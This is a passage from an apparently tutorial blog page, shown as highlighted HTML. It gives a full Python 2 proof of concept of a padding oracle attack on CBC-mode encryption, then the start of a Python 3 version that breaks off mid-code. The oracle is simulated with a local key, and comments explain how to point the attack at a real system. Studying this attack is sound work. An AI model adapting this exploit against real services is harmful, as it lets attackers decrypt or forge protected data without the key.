class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    This program is free software: you can redistribute it and/or modify</span><br><span class="hljs-string"></span><br><span class="hljs-string">    it under the terms of the GNU General Public License as published by</span><br><span class="hljs-string"></span><br><span class="hljs-string">    the Free Software Foundation, either version 3 of the License, or</span><br><span class="hljs-string"></span><br><span class="hljs-string">    (at your option) any later version.</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    This program is distributed in the hope that it will be useful,</span><br><span class="hljs-string"></span><br><span class="hljs-string">    but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-string"></span><br><span class="hljs-string">    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-string"></span><br><span class="hljs-string">    GNU General Public License for more details.</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    You should have received a copy of the GNU General Public License</span><br><span class="hljs-string"></span><br><span class="hljs-string">    along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br> <br><br><span class="hljs-keyword">import</span> sys<br><br> <br><br><span class="hljs-comment"># https://www.dlitz.net/software/pycrypto/</span><br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> binascii<br><br> <br><br><span class="hljs-comment"># the key for encrypt/decrypt</span><br><br><span class="hljs-comment"># we demo the poc here, so we need the key</span><br><br><span class="hljs-comment"># in real attack, you can trigger encrypt/decrypt in a complete blackbox env</span><br><br>ENCKEY = <span class="hljs-string">&#x27;abcdefgh&#x27;</span><br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">args</span>):<br><br>  <span class="hljs-built_in">print</span> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Padding Oracle Attack POC(CBC-MODE) ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== by axis ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== axis@ph4nt0m.org ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== 2011.9 ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <br><br> <br><br>  <span class="hljs-comment">########################################</span><br><br>  <span class="hljs-comment"># you may config this part by yourself</span><br><br>  iv = <span class="hljs-string">&#x27;12345678&#x27;</span><br><br>  plain = <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaX&#x27;</span><br><br>  plain_want = <span class="hljs-string">&quot;opaas&quot;</span><br><br> <br><br>  <span class="hljs-comment"># you can choose cipher: blowfish/AES/DES/DES3/CAST/ARC2 </span><br><br>  cipher = <span class="hljs-string">&quot;blowfish&quot;</span><br><br>  <span class="hljs-comment">########################################</span><br><br> <br><br>  block_size = <span class="hljs-number">8</span><br><br>  <span class="hljs-keyword">if</span> cipher.lower() == <span class="hljs-string">&quot;aes&quot;</span>:<br><br>    block_size = <span class="hljs-number">16</span><br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(iv) != block_size:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] IV must be &quot;</span>+<span class="hljs-built_in">str</span>(block_size)+<span class="hljs-string">&quot; bytes long(the same as block_size)!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Generate Target Ciphertext ===&quot;</span><br><br> <br><br>  ciphertext = encrypt(plain, iv, cipher)<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ciphertext:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Encrypt Error!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] plaintext is: &quot;</span>+plain<br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] iv is: &quot;</span>+hex_s(iv)<br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] ciphertext is: &quot;</span>+ hex_s(ciphertext)<br><br>  <span class="hljs-built_in">print</span><br><br> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Start Padding Oracle Decrypt ===&quot;</span><br><br>  <span class="hljs-built_in">print</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Choosing Cipher: &quot;</span>+cipher.upper()<br><br> <br><br>  guess = padding_oracle_decrypt(cipher, ciphertext, iv, block_size)<br><br> <br><br>  <span class="hljs-keyword">if</span> guess:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Guess intermediary value is: &quot;</span>+hex_s(guess[<span class="hljs-string">&quot;intermediary&quot;</span>])<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] plaintext = intermediary_value XOR original_IV&quot;</span><br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Guess plaintext is: &quot;</span>+guess[<span class="hljs-string">&quot;plaintext&quot;</span>]<br><br>    <span class="hljs-built_in">print</span><br><br> <br><br>    <span class="hljs-keyword">if</span> plain_want:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Start Padding Oracle Encrypt ===&quot;</span><br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] plaintext want to encrypt is: &quot;</span>+plain_want<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Choosing Cipher: &quot;</span>+cipher.upper()<br><br> <br><br>      en = padding_oracle_encrypt(cipher, ciphertext, plain_want, iv, block_size)<br><br> <br><br>      <span class="hljs-keyword">if</span> en:<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Encrypt Success!&quot;</span><br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] The ciphertext you want is: &quot;</span>+hex_s(en[block_size:])<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] IV is: &quot;</span>+hex_s(en[:block_size])<br><br>        <span class="hljs-built_in">print</span><br><br>       <br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Let&#x27;s verify the custom encrypt result ===&quot;</span><br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Decrypt of ciphertext &#x27;&quot;</span>+ hex_s(en[block_size:]) +<span class="hljs-string">&quot;&#x27; is:&quot;</span><br><br>        de = decrypt(en[block_size:], en[:block_size], cipher)<br><br>        <span class="hljs-keyword">if</span> de == add_PKCS5_padding(plain_want, block_size):<br><br>          <span class="hljs-built_in">print</span> de<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Bingo!&quot;</span><br><br>        <span class="hljs-keyword">else</span>:<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] It seems something wrong happened!&quot;</span><br><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_oracle_encrypt</span>(<span class="hljs-params">cipher, ciphertext, plaintext, iv, block_size=<span class="hljs-number">8</span></span>):<br><br>  <span class="hljs-comment"># the last block</span><br><br>  guess_cipher = ciphertext[<span class="hljs-number">0</span>-block_size:] <br><br> <br><br>  plaintext = add_PKCS5_padding(plaintext, block_size)<br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] After padding, plaintext becomes to: &quot;</span>+hex_s(plaintext)<br><br>  <span class="hljs-built_in">print</span><br><br> <br><br>  block = <span class="hljs-built_in">len</span>(plaintext)<br><br>  iv_nouse = iv <span class="hljs-comment"># no use here, in fact we only need intermediary</span><br><br>  prev_cipher = ciphertext[<span class="hljs-number">0</span>-block_size:] <span class="hljs-comment"># init with the last cipher block</span><br><br>  <span class="hljs-keyword">while</span> block &gt; <span class="hljs-number">0</span>:<br><br>    <span class="hljs-comment"># we need the intermediary value</span><br><br>    tmp = padding_oracle_decrypt_block(cipher, prev_cipher, iv_nouse, block_size, debug=<span class="hljs-literal">False</span>)<br><br> <br><br>    <span class="hljs-comment"># calculate the iv, the iv is the ciphertext of the previous block</span><br><br>    prev_cipher = xor_str( plaintext[block-block_size:block], tmp[<span class="hljs-string">&quot;intermediary&quot;</span>] )<br><br> <br><br>    <span class="hljs-comment">#save result</span><br><br>    guess_cipher = prev_cipher + guess_cipher<br><br> <br><br>    block = block - block_size<br><br> <br><br>  <span class="hljs-keyword">return</span> guess_cipher  <br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_oracle_decrypt</span>(<span class="hljs-params">cipher, ciphertext, iv, block_size=<span class="hljs-number">8</span>, debug=<span class="hljs-literal">True</span></span>):<br><br>  <span class="hljs-comment"># split cipher into blocks; we will manipulate ciphertext block by block</span><br><br>  cipher_block = split_cipher_block(ciphertext, block_size)<br><br> <br><br>  <span class="hljs-keyword">if</span> cipher_block:<br><br>    result = &#123;&#125;<br><br>    result[<span class="hljs-string">&quot;intermediary&quot;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br><br>    result[<span class="hljs-string">&quot;plaintext&quot;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br><br> <br><br>    counter = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher_block:<br><br>      <span class="hljs-keyword">if</span> debug:<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Now try to decrypt block &quot;</span>+<span class="hljs-built_in">str</span>(counter)<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Block &quot;</span>+<span class="hljs-built_in">str</span>(counter)+<span class="hljs-string">&quot;&#x27;s ciphertext is: &quot;</span>+hex_s(c)<br><br>        <span class="hljs-built_in">print</span><br><br>      <span class="hljs-comment"># padding oracle to each block</span><br><br>      guess = padding_oracle_decrypt_block(cipher, c, iv, block_size, debug)<br><br> <br><br>      <span class="hljs-keyword">if</span> guess:<br><br>        iv = c<br><br>        result[<span class="hljs-string">&quot;intermediary&quot;</span>] += guess[<span class="hljs-string">&quot;intermediary&quot;</span>]<br><br>        result[<span class="hljs-string">&quot;plaintext&quot;</span>] += guess[<span class="hljs-string">&quot;plaintext&quot;</span>]<br><br>        <span class="hljs-keyword">if</span> debug:<br><br>          <span class="hljs-built_in">print</span><br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Block &quot;</span>+<span class="hljs-built_in">str</span>(counter)+<span class="hljs-string">&quot; decrypt!&quot;</span><br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] intermediary value is: &quot;</span>+hex_s(guess[<span class="hljs-string">&quot;intermediary&quot;</span>])<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] The plaintext of block &quot;</span>+<span class="hljs-built_in">str</span>(counter)+<span class="hljs-string">&quot; is: &quot;</span>+guess[<span class="hljs-string">&quot;plaintext&quot;</span>]<br><br>          <span class="hljs-built_in">print</span><br><br>        counter = counter+<span class="hljs-number">1</span><br><br>      <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] padding oracle decrypt error!&quot;</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>    <span class="hljs-keyword">return</span> result<br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] ciphertext&#x27;s block_size is incorrect!&quot;</span>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_oracle_decrypt_block</span>(<span class="hljs-params">cipher, ciphertext, iv, block_size=<span class="hljs-number">8</span>, debug=<span class="hljs-literal">True</span></span>):<br><br>  result = &#123;&#125;<br><br>  plain = <span class="hljs-string">&#x27;&#x27;</span><br><br>  intermediary = []  <span class="hljs-comment"># list to save intermediary</span><br><br>  iv_p = [] <span class="hljs-comment"># list to save the iv we found</span><br><br> <br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, block_size+<span class="hljs-number">1</span>):<br><br>    iv_try = []<br><br>    iv_p = change_iv(iv_p, intermediary, i)<br><br> <br><br>    <span class="hljs-comment"># construct iv</span><br><br>    <span class="hljs-comment"># iv = \x00...(several 0 bytes) + \x0e(the bruteforce byte) + \xdc...(the iv bytes we found)</span><br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, block_size-i):<br><br>      iv_try.append(<span class="hljs-string">&quot;\x00&quot;</span>)<br><br> <br><br>    <span class="hljs-comment"># bruteforce iv byte for padding oracle</span><br><br>    <span class="hljs-comment"># 1 bytes to bruteforce, then append the rest bytes</span><br><br>    iv_try.append(<span class="hljs-string">&quot;\x00&quot;</span>)<br><br> <br><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br><br>      iv_tmp = iv_try<br><br>      iv_tmp[<span class="hljs-built_in">len</span>(iv_tmp)-<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(b)<br><br>    <br><br>      iv_tmp_s = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;%s&quot;</span> % ch <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> iv_tmp)<br><br> <br><br>      <span class="hljs-comment"># append the result of iv, we&#x27;ve just calculate it, saved in iv_p</span><br><br>      <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(iv_p)):<br><br>        iv_tmp_s += iv_p[<span class="hljs-built_in">len</span>(iv_p)-<span class="hljs-number">1</span>-p]<br><br>      <br><br>      <span class="hljs-comment"># in real attack, you have to replace this part to trigger the decrypt program</span><br><br>      <span class="hljs-comment">#print hex_s(iv_tmp_s) # for debug</span><br><br>      plain = decrypt(ciphertext, iv_tmp_s, cipher)<br><br>      <span class="hljs-comment">#print hex_s(plain) # for debug</span><br><br> <br><br>      <span class="hljs-comment"># got it!</span><br><br>      <span class="hljs-comment"># in real attack, you have to replace this part to the padding error judgement</span><br><br>      <span class="hljs-keyword">if</span> check_PKCS5_padding(plain, i):<br><br>        <span class="hljs-keyword">if</span> debug:<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Try IV: &quot;</span>+hex_s(iv_tmp_s)<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Found padding oracle: &quot;</span> + hex_s(plain)<br><br>        iv_p.append(<span class="hljs-built_in">chr</span>(b))<br><br>        intermediary.append(<span class="hljs-built_in">chr</span>(b ^ i))<br><br>        <br><br>        <span class="hljs-keyword">break</span><br><br> <br><br>  plain = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(intermediary)):<br><br>    plain += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(intermediary[<span class="hljs-built_in">len</span>(intermediary)-<span class="hljs-number">1</span>-ch]) ^ <span class="hljs-built_in">ord</span>(iv[ch]) )<br><br>    <br><br>  result[<span class="hljs-string">&quot;plaintext&quot;</span>] = plain<br><br>  result[<span class="hljs-string">&quot;intermediary&quot;</span>] = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;%s&quot;</span> % ch <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> intermediary)[::-<span class="hljs-number">1</span>]<br><br>  <span class="hljs-keyword">return</span> result<br><br> <br><br><span class="hljs-comment"># save the iv bytes found by padding oracle into a list</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_iv</span>(<span class="hljs-params">iv_p, intermediary, p</span>):<br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(iv_p)):<br><br>    iv_p[i] = <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(intermediary[i]) ^ p)<br><br>  <span class="hljs-keyword">return</span> iv_p  <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">split_cipher_block</span>(<span class="hljs-params">ciphertext, block_size=<span class="hljs-number">8</span></span>):<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ciphertext) % block_size != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  result = []<br><br>  length = <span class="hljs-number">0</span><br><br>  <span class="hljs-keyword">while</span> length &lt; <span class="hljs-built_in">len</span>(ciphertext):<br><br>    result.append(ciphertext[length:length+block_size])<br><br>    length += block_size<br><br> <br><br>  <span class="hljs-keyword">return</span> result<br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_PKCS5_padding</span>(<span class="hljs-params">plain, p</span>):<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(plain) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-comment"># convert the string</span><br><br>  plain = plain[::-<span class="hljs-number">1</span>]<br><br>  ch = <span class="hljs-number">0</span><br><br>  found = <span class="hljs-number">0</span><br><br>  <span class="hljs-keyword">while</span> ch &lt; p:<br><br>    <span class="hljs-keyword">if</span> plain[ch] == <span class="hljs-built_in">chr</span>(p):<br><br>      found += <span class="hljs-number">1</span><br><br>    ch += <span class="hljs-number">1</span> <br><br> <br><br>  <span class="hljs-keyword">if</span> found == p:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_PKCS5_padding</span>(<span class="hljs-params">plaintext, block_size</span>):<br><br>  s = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(plaintext) % block_size == <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> plaintext<br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(plaintext) &lt; block_size:<br><br>    padding = block_size - <span class="hljs-built_in">len</span>(plaintext)<br><br>  <span class="hljs-keyword">else</span>:<br><br>    padding = block_size - (<span class="hljs-built_in">len</span>(plaintext) % block_size)<br><br>  <br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, padding):<br><br>    plaintext += <span class="hljs-built_in">chr</span>(padding)<br><br> <br><br>  <span class="hljs-keyword">return</span> plaintext<br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, iv, cipher</span>):<br><br>  <span class="hljs-comment"># we only need the padding error itself, not the key</span><br><br>  <span class="hljs-comment"># you may gain padding error info in other ways</span><br><br>  <span class="hljs-comment"># in real attack, you may trigger decrypt program</span><br><br>  <span class="hljs-comment"># a complete blackbox environment</span><br><br>  key = ENCKEY<br><br> <br><br>  <span class="hljs-keyword">if</span> cipher.lower() == <span class="hljs-string">&quot;des&quot;</span>:<br><br>    o = DES.new(key, DES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;aes&quot;</span>:<br><br>    o = AES.new(key, AES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;des3&quot;</span>:<br><br>    o = DES3.new(key, DES3.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;blowfish&quot;</span>:<br><br>    o = Blowfish.new(key, Blowfish.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;cast&quot;</span>:<br><br>    o = CAST.new(key, CAST.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;arc2&quot;</span>:<br><br>    o = ARC2.new(key, ARC2.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(iv) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ciphertext) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-keyword">return</span> o.decrypt(ciphertext)<br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext, iv, cipher</span>):<br><br>  key = ENCKEY<br><br> <br><br>  <span class="hljs-keyword">if</span> cipher.lower() == <span class="hljs-string">&quot;des&quot;</span>:<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">8</span>:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] DES key must be 8 bytes long!&quot;</span><br><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    o = DES.new(key, DES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;aes&quot;</span>:<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">16</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">24</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">32</span>:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] AES key must be 16/24/32 bytes long!&quot;</span><br><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    o = AES.new(key, AES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;des3&quot;</span>:<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">16</span>:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Triple DES key must be 16 bytes long!&quot;</span><br><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    o = DES3.new(key, DES3.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;blowfish&quot;</span>:<br><br>    o = Blowfish.new(key, Blowfish.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;cast&quot;</span>:<br><br>    o = CAST.new(key, CAST.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;arc2&quot;</span>:<br><br>    o = ARC2.new(key, ARC2.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  plaintext = add_PKCS5_padding(plaintext, <span class="hljs-built_in">len</span>(iv))  <br><br> <br><br>  <span class="hljs-keyword">return</span> o.encrypt(plaintext)<br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_str</span>(<span class="hljs-params">a,b</span>):<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) != <span class="hljs-built_in">len</span>(b):<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  c = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a)):<br><br>    c += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(a[i]) ^ <span class="hljs-built_in">ord</span>(b[i]) )<br><br> <br><br>  <span class="hljs-keyword">return</span> c<br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_s</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br><br>  re = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br><br>    re += <span class="hljs-string">&quot;\\x&quot;</span>+binascii.b2a_hex(<span class="hljs-built_in">str</span>[i])<br><br>  <span class="hljs-keyword">return</span> re<br><br> <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>        main(sys.argv)<br></code></pre></td></tr></table></figure>

<h5 id="（3）python3"><a href="#（3）python3" class="headerlink" title="（3）python3"></a><strong>（3）python3</strong></h5><p>poa.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> hexdump <span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">import</span> IPython<br><br><br>plain = <span class="hljs-string">b&quot;Hello World! MTDP! RedTeam! 23333&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">POA</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    KEY = <span class="hljs-string">b&quot;1234567890abcdef&quot;</span><br>    IV = <span class="hljs-string">b&quot;0102030405060708&quot;</span><br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__pad</span>(<span class="hljs-params">cls, text: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;PKCS7 padding&quot;&quot;&quot;</span><br>        text_length = <span class="hljs-built_in">len</span>(text)<br>        amount_to_pad = AES.block_size - (text_length % AES.block_size)<br>        <span class="hljs-keyword">if</span> amount_to_pad == <span class="hljs-number">0</span>:<br>            amount_to_pad = AES.block_size<br>        pad = <span class="hljs-built_in">chr</span>(amount_to_pad).encode()<br>        <span class="hljs-keyword">return</span> text + pad * amount_to_pad<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__unpad</span>(<span class="hljs-params">cls, text: <span class="hljs-built_in">bytes</span></span>):<br>        pad = text[-<span class="hljs-number">1</span>]<br>        _pad = text[-pad:]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> _pad:<br>            <span class="hljs-keyword">if</span> pad != i:<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Error Padding! - %s&quot;</span> % _pad)<br>        <span class="hljs-keyword">return</span> text[:-pad]<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">cls, plain: <span 